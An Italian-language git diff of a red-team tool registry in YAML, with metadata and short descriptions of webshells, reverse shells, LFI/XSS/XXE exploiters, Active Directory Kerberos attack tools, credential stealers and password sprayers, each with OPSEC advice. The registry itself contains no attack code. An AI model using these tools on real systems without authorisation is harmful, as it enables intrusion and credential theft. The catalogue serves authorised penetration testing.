     l’uso a asset autorizzati; aggiornare il plugin e rimuovere artefatti post test.</p><br><hr>"
   best_in: false
-  category_path: ["02_Exploitation", "Web", "CMS_Exploits", "WordPress"]
+  category_path: [ "02_Exploitation", "Web", "CMS_Exploits", "WordPress" ]
   notes:
 
 - id: "wpxploit-1-0-0"
   name: "wpxploit"
   version: "1.0.0"
   icon: "../app/icons/github.svg"
-  kind: "tool"
-  phases: ["02_Exploitation"]
-  caps: ["xmlrpc-bruteforce", "credential-spraying"]
+  installation: "GitHub"
   repo: "https://github.com/relarizky/wpxploit"
   desc: "Script per XML‑RPC dictionary attack contro WordPress: login bruteforce e
     validazione credenziali."
@@ -2124,16 +1320,14 @@
     pulito per follow‑up.</li></ul><br><hr><h4 class=\"rt-blue\">Uso e OPSEC</h4><p>Rispettare
     rate‑limit e policy; preferire account canary e window autorizzate dal cliente.</p><br><hr>"
   best_in: false
-  category_path: ["02_Exploitation", "Web", "CMS_Exploits", "WordPress"]
+  category_path: [ "02_Exploitation", "Web", "CMS_Exploits", "WordPress" ]
   notes:
 
 - id: "wpxstrike"
   name: "WPXStrike"
   version: ""
   icon: "../app/icons/github.svg"
-  kind: "tool"
-  phases: ["02_Exploitation"]
-  caps: ["xss-to-rce", "wp-automation", "post-exploitation"]
+  installation: "GitHub"
   repo: "https://github.com/nowak0x01/WPXStrike"
   desc: "Script che eleva XSS a RCE su WordPress sfruttando chain note (plugin/theme)
     per esecuzione di codice."
@@ -2145,16 +1339,14 @@
     class=\"rt-blue\">Uso e OPSEC</h4><p>Usare su istanze di prova; rimuovere utenti/artefatti
     creati. Coordinarsi con Blue per detection use‑cases.</p><br><hr>"
   best_in: false
-  category_path: ["02_Exploitation", "Web", "CMS_Exploits", "WordPress"]
+  category_path: [ "02_Exploitation", "Web", "CMS_Exploits", "WordPress" ]
   notes:
 
 - id: "phpbash"
   name: "phpbash"
   version: ""
   icon: "../app/icons/github.svg"
-  kind: "webshell"
-  phases: ["02_Exploitation"]
-  caps: ["semi-interactive-shell", "tty-like", "exec"]
+  installation: "GitHub"
   repo: "https://github.com/Arrexel/phpbash"
   desc: "Web-shell PHP semi-interattiva con interfaccia tipo TTY per eseguire comandi,
     navigare filesystem e trasferire file post-upload"
@@ -2192,16 +1384,14 @@
     In pentesting autorizzato, phpbash è rapid evidence collection tool, non production
     persistence mechanism.</p><br><hr>"
   best_in: false
-  category_path: ["02_Exploitation", "Web", "File_Upload"]
+  category_path: [ "02_Exploitation", "Web", "File_Upload" ]
   notes:
 
 - id: "php-reverse-shell"
   name: "php-reverse-shell"
   version: ""
   icon: "../app/icons/github.svg"
-  kind: "webshell"
-  phases: ["02_Exploitation"]
-  caps: ["reverse-connection", "callback", "simple"]
+  installation: "GitHub"
   repo: "https://github.com/pentestmonkey/php-reverse-shell"
   desc: "Script PHP minimale per reverse shell verso listener controllato, veloce
     da configurare con solo IP/porta per callback post-upload"
@@ -2241,16 +1431,14 @@
     offrono più features ma php-reverse-shell rimane simple, reliable, widely compatible
     classic per quick access.</p><br><hr>"
   best_in: false
-  category_path: ["02_Exploitation", "Web", "File_Upload"]
+  category_path: [ "02_Exploitation", "Web", "File_Upload" ]
   notes:
 
 - id: "tomcat-cmd-jsp"
   name: "Tomcat_cmd.jsp"
   version: ""
   icon: "../app/icons/github.svg"
-  kind: "webshell"
-  phases: ["02_Exploitation"]
-  caps: ["jsp-shell", "tomcat-manage", "cmd-exec"]
+  installation: "GitHub"
   repo: "https://github.com/SecurityRiskAdvisors/cmd.jsp"
   desc: "Web-shell JSP universale per Tomcat/Java con command execution e file management
     basic, utile dove filtri PHP non applicabili"
@@ -2292,16 +1480,14 @@
     deploy WAR con backdoor è method più sofisticato con cleanup più controllato (undeploy
     application vs file system manipulation).</p><br><hr>"
   best_in: false
-  category_path: ["02_Exploitation", "Web", "File_Upload"]
+  category_path: [ "02_Exploitation", "Web", "File_Upload" ]
   notes:
 
 - id: "wwwolf-php-webshell"
   name: "wwwolf-php-webshell"
   version: ""
   icon: "../app/icons/github.svg"
-  kind: "webshell"
-  phases: ["02_Exploitation"]
-  caps: ["file-manager", "cmd-exec", "upload-download"]
+  installation: "GitHub"
   repo: "https://github.com/WhiteWinterWolf/wwwolf-php-webshell"
   desc: "Web-shell PHP completa con file manager, command execution e network functions
     per operazioni rapide post-upload e payload staging"
@@ -2348,16 +1534,14 @@
     o scenarios dove C2 infrastructure impractical, ma production engagements dovrebbero
     favor purpose-built tools con security considerations.</p><br><hr>"
   best_in: false
-  category_path: ["02_Exploitation", "Web", "File_Upload"]
+  category_path: [ "02_Exploitation", "Web", "File_Upload" ]
   notes:
 
 - id: "lfifreak"
   name: "LFiFreak"
   version: ""
   icon: "../app/icons/github.svg"
-  kind: "tool"
-  phases: ["02_Exploitation"]
-  caps: ["lfi-auto", "wrapper-bypass", "wordlist"]
+  installation: "GitHub"
   repo: "https://github.com/OsandaMalith/LFiFreak"
   desc: "Tool automazione LFI con test wrapper (php://, data://), bypass comuni e
     wordlist percorsi per escalation da file-read a code-exec"
@@ -2403,16 +1587,14 @@
     più serious compromises: treat discovery as critical e communicate immediate per
     defensive response coordination.</p><br><hr>"
   best_in: false
-  category_path: ["02_Exploitation", "Web", "Injection", "LFI"]
+  category_path: [ "02_Exploitation", "Web", "Injection", "LFI" ]
   notes:
 
 - id: "lfisuite"
   name: "LFISuite"
   version: ""
   icon: "../app/icons/github.svg"
-  kind: "tool"
-  phases: ["02_Exploitation"]
-  caps: ["lfi-enum", "bypass", "auto-exploit"]
+  installation: "GitHub"
   repo: "https://github.com/D35m0nd142/LFISuite"
   desc: "Toolkit per sfruttare LFI con tecniche enum, bypass, auto-exploitation inclusi
     log/session poisoning per catene LFI-to-RCE"
@@ -2456,16 +1638,14 @@
     che può cause collateral issues. Balance automation convenience con operational
     safety requirements per specific engagement.</p><br><hr>"
   best_in: false
-  category_path: ["02_Exploitation", "Web", "Injection", "LFI"]
+  category_path: [ "02_Exploitation", "Web", "Injection", "LFI" ]
   notes:
 
 - id: "liffy"
   name: "liffy"
   version: ""
   icon: "../app/icons/github.svg"
-  kind: "tool"
-  phases: ["02_Exploitation"]
-  caps: ["lfi-exploit", "rce-primitives", "wrapper-techniques"]
+  installation: "GitHub"
   repo: "https://github.com/mzfr/liffy"
   desc: "Tool exploitation LFI per RCE tramite tecniche note (log poisoning, php://filter,
     session injection) con payload generator e workflow guidato"
@@ -2510,16 +1690,14 @@
     production environments richiedono manual validation di automated results per
     verify accuracy e prevent false positive-driven actions.</p><br><hr>"
   best_in: false
-  category_path: ["02_Exploitation", "Web", "Injection", "LFI"]
+  category_path: [ "02_Exploitation", "Web", "Injection", "LFI" ]
   notes:
 
 - id: "xsstrike-3-1-6"
   name: "XSStrike"
   version: "3.1.6"
   icon: "../app/icons/github.svg"
-  kind: "tool"
-  phases: ["02_Exploitation"]
-  caps: ["xss-scan", "payload-gen", "crawler", "waf-testing"]
+  installation: "GitHub"
   repo: "https://github.com/s0md3v/XSStrike"
   desc: "Suite avanzata XSS con payload generator intelligente, crawler veloce e WAF
     fuzzer per validation riflessi/DOM e catene account takeover"
@@ -2564,16 +1742,14 @@
     guaranteed vulnerabilities: context matters significantly in XSS exploitability
     assessment.</p><br><hr>"
   best_in: false
-  category_path: ["02_Exploitation", "Web", "Injection", "XSS"]
+  category_path: [ "02_Exploitation", "Web", "Injection", "XSS" ]
   notes:
 
 - id: "xxeinjector"
   name: "XXEinjector"
   version: ""
   icon: "../app/icons/github.svg"
-  kind: "tool"
-  phases: ["02_Exploitation"]
-  caps: ["xxe-auto", "oob-exfil", "dir-enum"]
+  installation: "GitHub"
   repo: "https://github.com/enjoiz/XXEinjector"
   desc: "Automatizza l'exploitation XXE con canali in-band e OOB (file disclosure,
     SSRF, RCE in catena)."
@@ -2586,16 +1762,14 @@
     i listener OOB e limitare i path provati; rispettare i confini autorizzati del
     test.</p><br><hr>"
   best_in: false
-  category_path: ["02_Exploitation", "Web", "Injection", "XXE"]
+  category_path: [ "02_Exploitation", "Web", "Injection", "XXE" ]
   notes:
 
 - id: "poc-cve-2025-29927"
   name: "PoC CVE-2025-29927"
   version: ""
   icon: "../app/icons/github.svg"
-  kind: "exploit"
-  phases: ["02_Exploitation"]
-  caps: ["auth-bypass", "header-manipulation", "nextjs-middleware"]
+  installation: "GitHub"
   repo: ""
   desc: "PoC per CVE‑2025‑29927 (Next.js): bypass dell’autorizzazione lato middleware
     tramite header interni."
@@ -2607,16 +1781,14 @@
     con build locali per riprodurre il bug.</li></ul><br><hr><h4 class=\"rt-blue\">Uso e OPSEC</h4><p>Usare
     solo su app di test o con consenso; aggiornare Next.js alle versioni patchate.</p><br><hr>"
   best_in: false
-  category_path: ["02_Exploitation", "Web", "Next_js"]
+  category_path: [ "02_Exploitation", "Web", "Next_js" ]
   notes:
 
 - id: "cnvd-2020-10487-tomcat-ajp-lfi"
   name: "CNVD-2020-10487-Tomcat-Ajp-lfi"
   version: ""
   icon: "../app/icons/github.svg"
-  kind: "exploit"
-  phases: ["02_Exploitation"]
-  caps: ["ajp-lfi", "ghostcat", "file-read"]
+  installation: "GitHub"
   repo: "https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi"
   desc: "PoC LFI per Apache Tomcat via AJP (CNVD‑2020‑10487): lettura file locali
     e verifica di vulnerabilità."
@@ -2628,16 +1800,14 @@
     class=\"rt-blue\">Uso e OPSEC</h4><p>Eseguire solo su istanze autorizzate. Aggiornare/mitigare
     il connettore AJP secondo le linee guida del vendor.</p><br><hr>"
   best_in: false
-  category_path: ["02_Exploitation", "Web", "Tomcat"]
+  category_path: [ "02_Exploitation", "Web", "Tomcat" ]
   notes:
 
 - id: "kerbrute-linux-amd64"
   name: "kerbrute_linux_amd64"
   version: "1.0.3"
   icon: "../app/icons/github.svg"
-  kind: "tool"
-  phases: ["03_Post_Exploitation"]
-  caps: ["kerberos-preauth", "user-enum", "password-spraying"]
+  installation: "GitHub"
   repo: "https://github.com/ropnop/kerbrute"
   desc: "Tool Go per user enum e password spraying via Kerberos pre-auth a basso rumore,
     versione Linux con binaries precompilati"
@@ -2686,16 +1856,14 @@
     evasion in red team operations. Alternative detection: behavioral analytics identificano
     pattern enum anche quando individual requests appear legitimate.</p><br><hr>"
   best_in: false
-  category_path: ["03_Post_Exploitation", "AD_Windows", "Kerberos_ADCS_Relay"]
+  category_path: [ "03_Post_Exploitation", "AD_Windows", "Kerberos_ADCS_Relay" ]
   notes:
 
 - id: "krbrelayx"
   name: "krbrelayx"
   version: ""
   icon: "../app/icons/github.svg"
-  kind: "tool"
-  phases: ["03_Post_Exploitation"]
-  caps: ["kerberos-relay", "unconstrained-delegation", "adcs-abuse"]
+  installation: "GitHub"
   repo: "https://github.com/dirkjanm/krbrelayx"
   desc: "Toolkit per Kerberos relaying e abusi delegation (unconstrained/AD CS) con
     utility DNS/LDAP integration e dipendenze impacket/ldap3"
@@ -2737,16 +1905,14 @@
     significatively reduce relay attack surface: expect lower success rate in hardened
     environments versus legacy AD deployments.</p><br><hr>"
   best_in: false
-  category_path: ["03_Post_Exploitation", "AD_Windows", "Kerberos_ADCS_Relay"]
+  category_path: [ "03_Post_Exploitation", "AD_Windows", "Kerberos_ADCS_Relay" ]
   notes:
 
 - id: "nopac"
   name: "noPac"
   version: ""
   icon: "../app/icons/github.svg"
-  kind: "exploit"
-  phases: ["03_Post_Exploitation"]
-  caps: ["cve-2021-42278", "cve-2021-42287", "priv-esc-da"]
+  installation: "GitHub"
   repo: "https://github.com/Ridter/noPac"
   desc: "Exploit chain CVE-2021-42278/42287 per impersonare Domain Admin da utente
     standard su DC unpatched con sAMAccountName manipulation"
@@ -2790,16 +1956,14 @@
     authentication flows se mal eseguito, può leave forensics artifacts requiring
     extensive cleanup.</p><br><hr>"
   best_in: false
-  category_path: ["03_Post_Exploitation", "AD_Windows", "Kerberos_ADCS_Relay"]
+  category_path: [ "03_Post_Exploitation", "AD_Windows", "Kerberos_ADCS_Relay" ]
   notes:
 
 - id: "pkinittools"
   name: "PKINITtools"
   version: ""
   icon: "../app/icons/github.svg"
-  kind: "tool"
-  phases: ["03_Post_Exploitation"]
-  caps: ["pkinit", "adcs-relay", "certificate-auth"]
+  installation: "GitHub"
   repo: "https://github.com/dirkjanm/PKINITtools"
   desc: "Strumenti per PKINIT e relaying verso AD CS: richiesta TGT con smartcard/credenziali
     e attacchi di relay."
@@ -2812,16 +1976,14 @@
     class=\"rt-blue\">Uso e OPSEC</h4><p>Richiede forte coordinamento con Blue Team.
     Limitare la persistenza dei materiali chiave e bonificarli a fine test.</p><br><hr>"
   best_in: false
-  category_path: ["03_Post_Exploitation", "AD_Windows", "Kerberos_ADCS_Relay"]
+  category_path: [ "03_Post_Exploitation", "AD_Windows", "Kerberos_ADCS_Relay" ]
   notes:
 
 - id: "pywhisker"
   name: "pywhisker"
   version: ""
   icon: "../app/icons/github.svg"
-  kind: "tool"
-  phases: ["03_Post_Exploitation"]
-  caps: ["adcs-esc", "keycredentiallink", "shadow-credentials"]
+  installation: "GitHub"
   repo: "https://github.com/ShutdownRepo/pywhisker"
   desc: "Implementazione Python attacco Whisker per manipolare msDS-KeyCredentialLink
     e ottenere controllo account via Shadow Credentials technique"
@@ -2878,16 +2040,14 @@
     con customization per evasion in red team operations. Alternative detection: behavioral
     analytics identificano pattern enum anche quando individual requests appear legitimate.</p><br><hr>"
   best_in: false
-  category_path: ["03_Post_Exploitation", "AD_Windows", "Kerberos_ADCS_Relay"]
+  category_path: [ "03_Post_Exploitation", "AD_Windows", "Kerberos_ADCS_Relay" ]
   notes:
 
 - id: "kerberos-windows-scripts"
   name: "kerberos_windows_scripts"
   version: ""
   icon: "../app/icons/github.svg"
-  kind: "toolkit"
-  phases: ["03_Post_Exploitation"]
-  caps: ["kerberos-cli", "ticket-ops", "linux-ad-integration"]
+  installation: "GitHub"
   repo: "https://github.com/ropnop/kerberos_windows_scripts"
   desc: "Raccolta script bash per interagire con Kerberos AD da Linux (ticket ops,
     realm management) e integration con network tool"
@@ -2924,16 +2084,14 @@
     environments dove installing tools problematic, quick one-off testing senza overhead
     tool installation.</p><br><hr>"
   best_in: false
-  category_path: ["03_Post_Exploitation", "AD_Windows", "Recon_Health"]
+  category_path: [ "03_Post_Exploitation", "AD_Windows", "Recon_Health" ]
   notes:
 
 - id: "kerbrute"
   name: "kerbrute"
   version: "1.0.3"
   icon: "../app/icons/github.svg"
-  kind: "tool"
-  phases: ["03_Post_Exploitation"]
-  caps: ["kerberos-preauth", "user-enum", "spray"]
+  installation: "GitHub"
   repo: "https://github.com/ropnop/kerbrute"
   desc: "Pre-auth bruteforcer/enumerator AD con output pulito e threading, identico
     a kerbrute-win ma entry separata per consistency registry"
@@ -2952,16 +2110,14 @@
     admin</code> - Single user brute (sconsigliato)</p><p>Per documentation completa,
     vedere entry kerbrute-linux-amd64 e kerbrute-win in questo registry.</p><br><hr>"
   best_in: false
-  category_path: ["03_Post_Exploitation", "AD_Windows", "Recon_Health"]
+  category_path: [ "03_Post_Exploitation", "AD_Windows", "Recon_Health" ]
   notes:
 
 - id: "dehashed"
   name: "Dehashed"
   version: ""
   icon: "../app/icons/github.svg"
-  kind: "service"
-  phases: ["03_Post_Exploitation"]
-  caps: ["breach-data", "osint", "credentials-hunting"]
+  installation: "GitHub"
   repo: ""
   desc: "Servizio OSINT per query breach data (email/username/hash/IP) via web/API
     utile per wordlist enrichment e compromission verification"
@@ -3006,16 +2162,14 @@
     DeHashed value proposition: comprehensive database, detailed metadata, API automation
     capability per large-scale assessments.</p><br><hr>"
   best_in: false
-  category_path: ["03_Post_Exploitation", "Credentials", "Credentials_Hunting"]
+  category_path: [ "03_Post_Exploitation", "Credentials", "Credentials_Hunting" ]
   notes:
 
 - id: "dehashed-py"
   name: "dehashed.py"
   version: ""
   icon: "../app/icons/github.svg"
-  kind: "tool"
-  phases: ["03_Post_Exploitation"]
-  caps: ["dehashed-api", "csv-export", "query-automation"]
+  installation: "GitHub"
   repo: ""
   desc: "Client Python per DeHashed API con CSV export e query automation per enrichment
     OSINT e breach correlation in pipeline"
@@ -3058,16 +2212,14 @@
     executed, results obtained, actions taken based su findings per compliance e incident
     review.</p><br><hr>"
   best_in: false
-  category_path: ["03_Post_Exploitation", "Credentials", "Credentials_Hunting"]
+  category_path: [ "03_Post_Exploitation", "Credentials", "Credentials_Hunting" ]
   notes:
 
 - id: "firefox-decrypt-main"
   name: "firefox_decrypt-main"
   version: ""
   icon: "../app/icons/github.svg"
-  kind: "tool"
-  phases: ["03_Post_Exploitation"]
-  caps: ["firefox-secrets", "password-decrypt", "nss"]
+  installation: "GitHub"
   repo: "https://github.com/unode/firefox_decrypt"
   desc: "Tool per estrarre e decifrare password da profili Firefox/derivati con NSS
     library support e override path per discovery fallimenti"
@@ -3112,16 +2264,14 @@
     URLs/services senza full credential disclosure. Tool è investigation aid: operator
     ensures lawful authorized access a profiles analyzed.</p><br><hr>"
   best_in: false
-  category_path: ["03_Post_Exploitation", "Credentials", "Credentials_Hunting"]
+  category_path: [ "03_Post_Exploitation", "Credentials", "Credentials_Hunting" ]
   notes:
 
 - id: "lazagne-2-4-7"
   name: "LaZagne"
   version: "2.4.7"
   icon: "../app/icons/github.svg"
-  kind: "tool"
-  phases: ["03_Post_Exploitation"]
-  caps: ["credential-recovery", "browser-mail-vaults", "windows"]
+  installation: "GitHub"
   repo: "https://github.com/AlessandroZ/LaZagne"
   desc: "Estrae password e segreti da applicazioni locali (Windows/Linux/macOS): browser,
     mail, wifi, database ecc."
@@ -3135,16 +2285,14 @@
     a ciò che serve e proteggere l’output con cifratura/trasporto sicuro. Richiede
     contesto locale dell’utente.</p><br><hr>"
   best_in: false
-  category_path: ["03_Post_Exploitation", "Credentials", "Credentials_Hunting"]
+  category_path: [ "03_Post_Exploitation", "Credentials", "Credentials_Hunting" ]
   notes:
 
 - id: "mailsniper"
   name: "MailSniper"
   version: ""
   icon: "../app/icons/github.svg"
-  kind: "tool"
-  phases: ["03_Post_Exploitation"]
-  caps: ["exchange-search", "ews", "o365", "keyword-hunt"]
+  installation: "GitHub"
   repo: "https://github.com/dafthack/MailSniper"
   desc: "Sfrutta e enumera ambienti Exchange/Office 365: autodiscover, OWA/EWS, ricerca
     inbox, spraying e relaying."
@@ -3157,16 +2305,14 @@
     rt-blue\">Uso e OPSEC</h4><p>Regolare rate‑limit e sleep per evitare lockout.
     Usare scopi strettamente autorizzati su tenant test.</p><br><hr>"
   best_in: false
-  category_path: ["03_Post_Exploitation", "Credentials", "Credentials_Hunting"]
+  category_path: [ "03_Post_Exploitation", "Credentials", "Credentials_Hunting" ]
   notes:
 
 - id: "net-creds"
   name: "net-creds"
   version: ""
   icon: "../app/icons/github.svg"
-  kind: "tool"
-  phases: ["03_Post_Exploitation"]
-  caps: ["pcap-live-sniff", "creds-extract", "protocol-auto"]
+  installation: "GitHub"
   repo: "https://github.com/DanMcInerney/net-creds"
   desc: "Sniffer di credenziali da Live capture/PCAP (HTTP Basic/NTLM, Kerberos, IMAP/POP/SMTP,
     FTP, SNMP, carte)."
@@ -3180,16 +2326,14 @@
     solo quanto autorizzato e minimizzare il dwell time. Preferire filtri BPF per
     ridurre il rumore.</p><br><hr>"
   best_in: false
-  category_path: ["03_Post_Exploitation", "Credentials", "Credentials_Hunting"]
+  category_path: [ "03_Post_Exploitation", "Credentials", "Credentials_Hunting" ]
   notes:
 
 - id: "pcredz"
   name: "PCredz"
   version: ""
   icon: "../app/icons/github.svg"
-  kind: "tool"
-  phases: ["03_Post_Exploitation"]
-  caps: ["pcap-parse", "ntlm-kerberos", "creds-extract"]
+  installation: "GitHub"
   repo: "https://github.com/lgandx/PCredz"
   desc: "Estrae credenziali/hash da PCAP o interfacce live (NTLM, Kerberos, HTTP,
     IMAP/POP/SMTP, FTP, SNMP)."
@@ -3201,16 +2345,14 @@
     Python standalone.</li></ul><br><hr><h4 class=\"rt-blue\">Uso e OPSEC</h4><p>Applicare
     filtri BPF e conservare i log in modo sicuro. Solo su reti/catture autorizzate.</p><br><hr>"
   best_in: false
-  category_path: ["03_Post_Exploitation", "Credentials", "Credentials_Hunting"]
+  category_path: [ "03_Post_Exploitation", "Credentials", "Credentials_Hunting" ]
   notes:
 
 - id: "credking"
   name: "CredKing"
   version: ""
   icon: "../app/icons/github.svg"
-  kind: "tool"
-  phases: ["03_Post_Exploitation"]
-  caps: ["password-spraying", "aws-lambda", "ip-rotation"]
+  installation: "GitHub"
   repo: "https://github.com/ustayready/CredKing"
   desc: "Password spraying su più protocolli con rotazione proxy e gestione lockout;
     supporta O365/ADFS/Okta e simili."
@@ -3222,16 +2364,14 @@
     degli account validati e stati MFA.</li></ul><br><hr><h4 class=\"rt-blue\">Uso e OPSEC</h4><p>Applicare
     sleep/cohorting, rispettare policy del cliente e limitare tentativi per utente.</p><br><hr>"
   best_in: false
-  category_path: ["03_Post_Exploitation", "Credentials", "Passwords_Cracking"]
+  category_path: [ "03_Post_Exploitation", "Credentials", "Passwords_Cracking" ]
   notes:
 
 - id: "decrypt-chrome-passwords-main"
   name: "decrypt-chrome-passwords"
   version: ""
   icon: "../app/icons/github.svg"
-  kind: "tool"
-  phases: ["03_Post_Exploitation"]
-  caps: ["chrome-secrets", "password-decrypt", "windows"]
+  installation: "GitHub"
   repo: "https://github.com/ohyicong/decrypt-chrome-passwords"
   desc: "Estrae e decritta le password salvate in Chrome (Windows) usando DPAPI e
     il profilo locale."
@@ -3243,16 +2383,14 @@
     class=\"rt-blue\">Uso e OPSEC</h4><p>Richiede contesto utente. Conservare gli
     output in modo sicuro e rispettare policy di gestione segreti.</p><br><hr>"
   best_in: false
-  category_path: ["03_Post_Exploitation", "Credentials", "Passwords_Cracking"]
+  category_path: [ "03_Post_Exploitation", "Credentials", "Passwords_Cracking" ]
   notes:
 
 - id: "htb-wordlist"
   name: "HTB-wordlist"
   version: ""
   icon: "../app/icons/github.svg"
-  kind: "wordlist"
-  phases: ["03_Post_Exploitation"]
-  caps: ["custom-wordlists", "bruteforce", "enum"]
+  installation: "GitHub"
   repo: ""
   desc: "Selezione di wordlist usate in HackTheBox per enum e bruteforce; alternativa
     ai pacchetti SecLists."
@@ -3264,16 +2402,14 @@
     a OWASP SecLists e raccolte community.</li></ul><br><hr><h4 class=\"rt-blue\">Uso e OPSEC</h4><p>Valutare
     l’impatto sui rate‑limit. Filtrare e deduplicare per ridurre richieste superflue.</p><br><hr>"
   best_in: false
-  category_path: ["03_Post_Exploitation", "Credentials", "Passwords_Cracking"]
+  category_path: [ "03_Post_Exploitation", "Credentials", "Passwords_Cracking" ]
   notes:
 
 - id: "omnispray"
   name: "Omnispray"
   version: ""
   icon: "../app/icons/github.svg"
-  kind: "framework"
-  phases: ["03_Post_Exploitation"]
-  caps: ["modular-spraying", "m365", "generic-idp"]
+  installation: "GitHub"
   repo: "https://github.com/0xZDH/Omnispray"
   desc: "Framework modulare per enumeration e password spraying su servizi enterprise
     con output strutturato."
@@ -3285,16 +2421,14 @@
     risultati per follow‑up (CSV/JSON).</li></ul><br><hr><h4 class=\"rt-blue\">Uso e OPSEC</h4><p>Pianificare
     le finestre di spraying e segmentare le liste utenti per conformità alle policy.</p><br><hr>"
   best_in: false
-  category_path: ["03_Post_Exploitation", "Credentials", "Passwords_Cracking"]
+  category_path: [ "03_Post_Exploitation", "Credentials", "Passwords_Cracking" ]
   notes:
 
 - id: "statistically-likely-usernames"
   name: "statistically-likely-usernames"
   version: ""
   icon: "../app/icons/github.svg"
-  kind: "wordlist"
-  phases: ["03_Post_Exploitation"]
-  caps: ["username-generation", "corp-patterns"]
+  installation: "GitHub"
   repo: "https://github.com/insidetrust/statistically-likely-usernames"
   desc: "Generatore di username plausibili a partire da nomi reali, frequenze e formati
     aziendali."
@@ -3306,16 +2440,14 @@
     class=\"rt-blue\">Uso e OPSEC</h4><p>Allineare i formati all’azienda target per
     ridurre il rumore e il footprint durante l’enumerazione.</p><br><hr>"
   best_in: false
-  category_path: ["03_Post_Exploitation", "Credentials", "Passwords_Cracking"]
+  category_path: [ "03_Post_Exploitation", "Credentials", "Passwords_Cracking" ]
   notes:
 
 - id: "username-anarchy-0-6"
   name: "username-anarchy"
   version: "0.6"
   icon: "../app/icons/github.svg"
-  kind: "tool"
-  phases: ["03_Post_Exploitation"]
-  caps: ["username-generation", "pattern-rules"]
+  installation: "GitHub"
   repo: "https://github.com/urbanadventurer/username-anarchy"
   desc: "Crea varianti di username da nomi completi con pattern personalizzabili e
     output per spraying."
@@ -3327,16 +2459,14 @@
     singola/CSV per tool downstream.</li></ul><br><hr><h4 class=\"rt-blue\">Uso e OPSEC</h4><p>Usare
     dataset minimi per evitare liste inutilmente grandi; combinare con OSINT aziendale.</p><br><hr>"
   best_in: false
-  category_path: ["03_Post_Exploitation", "Credentials", "Passwords_Cracking"]
+  category_path: [ "03_Post_Exploitation", "Credentials", "Passwords_Cracking" ]
   notes:
 
 - id: "bashfuscator"
   name: "Bashfuscator"
   version: ""
   icon: "../app/icons/github.svg"
-  kind: "tool"
-  phases: ["03_Post_Exploitation"]
-  caps: ["bash-obfuscation", "mutators", "randomization"]
+  installation: "GitHub"
   repo: "https://github.com/Bashfuscator/Bashfuscator"
   desc: "Framework di offuscamento per script Bash: encoder, mutatori e generatori
     polimorfi per bypass basici."
@@ -3348,16 +2478,14 @@
     class=\"rt-blue\">Uso e OPSEC</h4><p>Usare su script propri e in ambienti controllati.
     Documentare le trasformazioni per analisi post‑test.</p><br><hr>"
   best_in: false
-  category_path: ["03_Post_Exploitation", "Evasion"]
+  category_path: [ "03_Post_Exploitation", "Evasion" ]
   notes:
 
 - id: "ligolo-ng"
   name: "Ligolo-ng"
   version: "0.8.2"
   icon: "../app/icons/github.svg"
-  kind: "tool"
-  phases: ["03_Post_Exploitation"]
-  caps: ["reverse-tunnel", "tun-interface", "tcp-tls", "autoroute"]
+  installation: "GitHub"
   repo: "https://github.com/nicocha30/ligolo-ng"
   desc: "Tunneling/reverse SOCKS rapido per pivoting su reti compromesse; agent &
     proxy, supporto UDP/TCP, tun interface e relay."
@@ -3373,16 +2501,14 @@
     filtri e rotte solo per gli obiettivi necessari e preferire TLS/mTLS per proteggere
     i canali.</p><br><hr>"
   best_in: false
-  category_path: ["03_Post_Exploitation", "Pivoting"]
+  category_path: [ "03_Post_Exploitation", "Pivoting" ]
   notes:
 
 - id: "linenum"
   name: "LinEnum"
   version: ""
   icon: "../app/icons/github.svg"
-  kind: "tool"
-  phases: ["03_Post_Exploitation"]
-  caps: ["linux-enum", "privesc-checks", "baseline"]
+  installation: "GitHub"
   repo: "https://github.com/rebootuser/LinEnum"
   desc: "Script di enumerazione privesc su Linux: raccoglie info su kernel, SUID,
     servizi, credenziali e misconfig."
@@ -3396,16 +2522,14 @@
     con output su file per analisi offline. Limitare i check rumorosi in ambienti
     sensibili.</p><br><hr>"
   best_in: false
-  category_path: ["03_Post_Exploitation", "Privilege_Escalation", "Linux"]
+  category_path: [ "03_Post_Exploitation", "Privilege_Escalation", "Linux" ]
   notes:
 
 - id: "logrotten-2-1"
   name: "logrotten"
   version: "2.1"
   icon: "../app/icons/github.svg"
-  kind: "exploit"
-  phases: ["03_Post_Exploitation"]
-  caps: ["logrotate-race", "file-replace", "priv-esc"]
+  installation: "GitHub"
   repo: "https://github.com/whotwagner/logrotten"
   desc: "Exploit di logrotate (race condition) per privesc locale sfruttando file
     controllati dall'utente."
@@ -3418,16 +2542,14 @@
     in ambienti di test. Richiede condizioni specifiche (permessi/logrotate config
     vulnerabile).</p><br><hr>"
   best_in: false
-  category_path: ["03_Post_Exploitation", "Privilege_Escalation", "Linux"]
+  category_path: [ "03_Post_Exploitation", "Privilege_Escalation", "Linux" ]
   notes:
 
 - id: "one-gadget-1-10-0"
   name: "OneGadget"
   version: "1.10.0"
   icon: "../app/icons/github.svg"
-  kind: "tool"
-  phases: ["03_Post_Exploitation"]
-  caps: ["libc-gadgets", "rce-primitives", "ctf"]
+  installation: "GitHub"
   repo: "https://github.com/david942j/one_gadget"
   desc: "Trova gadget RCE in libc.so.6 (one_gadget) via esecuzione simbolica; output
     offsets e vincoli d’uso."
@@ -3439,16 +2561,14 @@
     distanza da funzioni/GOT.</li></ul><br><hr><h4 class=\"rt-blue\">Uso e OPSEC</h4><p>Utile
     in CTF e ricerca; mantenere mapping tra binari/libc per riproducibilità.</p><br><hr>"
   best_in: false
-  category_path: ["03_Post_Exploitation", "Privilege_Escalation", "Linux"]
+  category_path: [ "03_Post_Exploitation", "Privilege_Escalation", "Linux" ]
   notes:
 
 - id: "pspy"
   name: "pspy"
   version: ""
   icon: "../app/icons/github.svg"
-  kind: "tool"
-  phases: ["03_Post_Exploitation"]
-  caps: ["process-snoop", "cron-watch", "no-root"]
+  installation: "GitHub"
   repo: "https://github.com/DominicBreuker/pspy"
   desc: "Monitor di processi Linux senza root per enumerare esecuzioni, cron e comandi
     utili a privesc."
@@ -3462,16 +2582,14 @@
     dal path dell’utente per ridurre indicatori. Filtrare il rumore con pattern per
     isolare processi interessanti.</p><br><hr>"
   best_in: false
-  category_path: ["03_Post_Exploitation", "Privilege_Escalation", "Linux"]
+  category_path: [ "03_Post_Exploitation", "Privilege_Escalation", "Linux" ]
   notes:
 
 - id: "screen-exploit-poc"
   name: "screen-exploit-poc.sh"
   version: ""
   icon: "../app/icons/github.svg"
-  kind: "exploit"
-  phases: ["03_Post_Exploitation"]
-  caps: ["screen-privesc", "local-exploit"]
+  installation: "GitHub"
   repo: ""
   desc: "PoC per auth‑bypass di ConnectWise ScreenConnect che consente creazione utente
     admin e RCE in catena."
@@ -3483,16 +2601,14 @@
